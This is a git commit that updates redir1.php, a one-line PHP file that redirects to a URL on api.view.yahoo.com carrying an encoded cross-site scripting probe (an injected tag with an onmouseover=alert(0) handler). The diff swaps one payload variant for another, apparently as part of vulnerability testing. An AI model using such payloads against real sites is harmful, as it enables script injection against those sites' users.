cc0d1eca01068f5231e745f5c15086dfa72248f1
missoum1307 <missoum1307@users.noreply.github.com>
2017-12-21 22:45:28 +0100

    Update redir1.php

--- redir1.php
+++ redir1.php
@@ -1,1 +1,1 @@
-<?php header('location: http://api.view.yahoo.com/api/series/xxxxxa%3Cq~%250aonmouseover=alert(0)%3E') ?> 
+<?php header('location: http://api.view.yahoo.com/api/series/xxxxxa%3Cx~%250aonmouseover=alert(0)%3Eqqqq') ?> 
